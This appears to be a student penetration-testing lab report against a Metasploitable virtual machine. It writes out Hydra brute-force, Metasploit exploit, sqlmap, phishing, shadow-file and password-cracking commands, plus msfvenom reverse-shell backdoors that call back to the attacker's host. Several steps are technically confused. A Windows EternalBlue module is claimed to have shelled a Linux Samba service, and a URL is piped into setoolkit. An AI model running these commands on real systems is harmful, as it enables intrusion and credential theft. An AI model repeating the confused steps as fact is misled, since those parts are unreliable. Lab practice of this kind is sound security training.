## 1. Introduction

This project demonstrates the principles of network security and penetration testing using Kali Linux and Metasploitable. The primary objective is to identify and exploit vulnerabilities in Metasploitable’s network services, implement post-exploitation techniques, and propose mitigation strategies to secure such systems.

## 2. Phase 1: Reconnaissance - Gathering Initial Information

#### **Objective:**

Identify open ports, running services, and potential vulnerabilities on the Metasploitable machine.

#### **Tools Used:**

* **Nmap**: For comprehensive network scanning and service detection.
* **Wireshark**: For deep network traffic analysis.
* **enum4linux**: For SMB enumeration and identifying shared resources.
* **Nikto**: For web server scanning to identify vulnerabilities.
* **sqlmap**: For automated SQL injection detection and exploitation.
* **Metasploit Framework**: For exploiting vulnerabilities and post-exploitation tasks.
* **Hydra**: For performing brute force attacks on multiple services.
* **John the Ripper**: For offline password cracking and analyzing password security.
* **Burp Suite**: For web application vulnerability scanning and testing.
* **Gobuster**: For directory and file brute-forcing to discover hidden resources on web servers.

#### **Steps:**

1. Perform an initial network scan to discover open ports using advanced Nmap features:

   ```
   nmap -A [Metasploitable_IP]
   ```
2. Analyze the scan results:

   * Identify open ports (e.g., 21 for FTP, 22 for SSH, 445 for SMB, 80 for HTTP).
   * Document running services and their versions.
3. Save the scan results:

   ```
   nmap -A [Metasploitable_IP] -oN reconnaissance_results.txt
   ```
4. Use Wireshark to analyze network traffic and detect unusual patterns, protocols, or potential vulnerabilities:

   * Capture packets for further analysis.
   * Filter traffic to focus on target-specific data.
5. Use enum4linux to enumerate SMB services and identify misconfigurations, shared files, and user accounts:

   ```
   enum4linux [Metasploitable_IP]
   ```
6. Use Nikto to scan the web server for vulnerabilities:

   ```
   nikto -h http://[Metasploitable_IP]
   ```

   * Identify outdated software, misconfigurations, or default files that can be exploited.
7. Use Gobuster to brute-force hidden directories and files on the web server:

   ```
   gobuster dir -u http://[Metasploitable_IP] -w /usr/share/wordlists/dirb/common.txt
   ```

   * Discover hidden resources that might contain sensitive information or vulnerabilities.

#### **Findings:**

* Open Ports: 21 (FTP), 22 (SSH), 445 (SMB), 80 (HTTP)
* Services Detected:
  * FTP (vsftpd 2.3.4)
  * SSH (OpenSSH 4.3)
  * SMB (Samba 3.0.20)
  * HTTP (Apache 2.2.8 with PHP 5.2.4)

## 3. Phase 2: Exploiting Vulnerabilities - Taking Advantage of Weaknesses

#### **Option 1: SSH Brute Force**

1. **Objective:** Gain access via SSH by cracking weak credentials.
2. **Tool Used:**
   * Hydra
3. **Command:**
   ```
   hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://[Metasploitable_IP]
   ```
4. **Outcome:**
   * Discovered the password: `<span>123456</span>`
   * Gained SSH access as the root user.

#### **Option 2: SMB Exploits**

1. **Objective:** Exploit vulnerabilities in the SMB protocol.
2. **Tool Used:**
   * Metasploit Framework
3. **Steps:**
   * Launch Metasploit:
     ```
     msfconsole
     ```
   * Use the EternalBlue exploit:
     ```
     use exploit/windows/smb/ms17_010_eternalblue
     set RHOSTS [Metasploitable_IP]
     exploit
     ```
4. **Outcome:**
   * Successfully exploited the SMB service and gained a reverse shell.

#### **Option 3: FTP Exploits**

1. **Objective:** Exploit vulnerabilities in the FTP service.
2. **Steps:**
   * Check for anonymous login:
     ```
     ftp [Metasploitable_IP]
     ```
   * Use Metasploit to exploit vsftpd backdoor:
     ```
     use exploit/unix/ftp/vsftpd_234_backdoor
     set RHOST [Metasploitable_IP]
     exploit
     ```
3. **Outcome:**
   * Obtained a reverse shell via the FTP backdoor and used the session to map the file system, exfiltrate sensitive files, and identify further attack vectors.

#### **Option 4: HTTP Exploits**

1. **Objective:** Exploit vulnerabilities in the web application hosted on HTTP.
2. **Steps:**
   * **SQL Injection**:
     * Use sqlmap to identify and exploit SQL injection vulnerabilities by automating database queries and extracting critical information:
       ```
       sqlmap -u "http://[Metasploitable_IP]/vulnerable_page?param=value" --dbs
       ```
   * **XSS Testing**:
     * Insert test scripts (e.g., `<span><script>alert('XSS');</script></span>`) in input fields.
3. **Outcome:**
   * Retrieved sensitive database information via SQL injection.
   * Demonstrated script execution for XSS.
4. **Phishing Attack**:
   * Use Burp Suite to craft and deliver a phishing page on Apache, enhancing the sophistication of the attack:
     ```
     sudo service apache2 start
     sudo cp phishing_email.html /var/www/html/phishing.html
     ```
   * Generate a phishing link:
     ```
     echo "http://[Kali_IP]/phishing.html" | setoolkit
     ```
   * Analyze the victim’s behavior upon accessing the phishing link.

#### **Option 5: Password Cracking with John the Ripper**

1. **Objective:** Crack hashed passwords retrieved during post-exploitation.
2. **Steps:**
   * Save the hashes to a file (e.g., `<span>hashes.txt</span>`).
   * Run John the Ripper:
     ```
     john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
     ```
3. **Outcome:**
   * Recovered plaintext passwords from hashed values.

## 4. Phase 3: Post-Exploitation - Expanding Access and Persistence

#### **Objective:**

Explore the target system further, escalate privileges, and gather sensitive information.

#### **Techniques Used:**

1. **Shell Access:**
   * Managed active sessions in Metasploit and executed post-exploitation modules for credential harvesting and lateral movement:
     ```
     sessions -i [session_ID]
     ```
2. **Privilege Escalation:**
   * Checked for SUID binaries:
     ```
     find / -perm -4000 2>/dev/null
     ```
   * Exploited a misconfigured binary to gain root privileges.
3. **Data Gathering:**
   * Accessed sensitive files:
     ```
     cat /etc/passwd
     cat /etc/shadow
     ```
   * Extracted user credentials and configuration files.
4. **Maintaining Access:**
   * Created a persistent backdoor:
     ```
     msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[Kali_IP] LPORT=4444 -f elf > backdoor.elf
     scp backdoor.elf root@[Metasploitable_IP]:/tmp
     chmod +x /tmp/backdoor.elf
     ```

## 5. Phase 4: Recommendations and Mitigation - Securing the System

#### **Vulnerabilities and Fixes:**

1. **SSH:**
   * Use strong passwords and key-based authentication.
   * Disable root login over SSH.
2. **SMB:**
   * Apply patches for known vulnerabilities like EternalBlue.
   * Disable unused SMB versions.
3. **FTP:**
   * Disable anonymous access.
   * Use secure alternatives like SFTP.
4. **HTTP:**
   * Sanitize input to prevent SQL injection and XSS.
   * Regularly update web server and application software.
5. **Phishing Attacks:**
   * Deploy anti-phishing tools.
   * Conduct regular security awareness training.

#### **General Recommendations:**

* Use firewalls to restrict access to unnecessary services.
* Regularly update and patch systems.
* Conduct periodic vulnerability assessments.

## 6. Personal Effort: Enhancements to the Project

### **1. Automated Workflow with Scripts**

* Developed Bash scripts to automate reconnaissance and exploitation tasks.
  * Example script for Nmap and enum4linux:
    ```
    # Automated Recon Script
    nmap -A [TARGET_IP] -oN nmap_results.txt
    enum4linux [TARGET_IP] > smb_enum.txt
    ```
* Benefit: Saves time and demonstrates scripting proficiency.

### **2. Visualization of Findings**

* Used **Maltego** to create graphical representations of:
  * Network topology.
  * Open ports and services.
  * Identified vulnerabilities.
* Benefit: Enhances clarity and professional presentation.

### **3. Advanced Exploitation Techniques**

* Created a custom Metasploit payload for undetectable backdoor access:
  ```
  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[Kali_IP] LPORT=5555 -f elf > stealth_backdoor.elf
  ```
* Simulated multi-stage attacks by chaining vulnerabilities.

### **4. Enhanced Post-Exploitation Scenarios**

* Gathered detailed target information:
  * Extracted browser histories and saved passwords.
  * Collected system logs for further analysis.
* Simulated lateral movement to other virtual machines in the network.

## 7. Conclusion - Lessons Learned and Future Considerations

This project provided hands-on experience in identifying and exploiting network vulnerabilities, post-exploitation techniques, and designing mitigation strategies. The knowledge gained highlights the importance of securing systems against common threats and the value of ethical penetration testing in enhancing cybersecurity defenses.
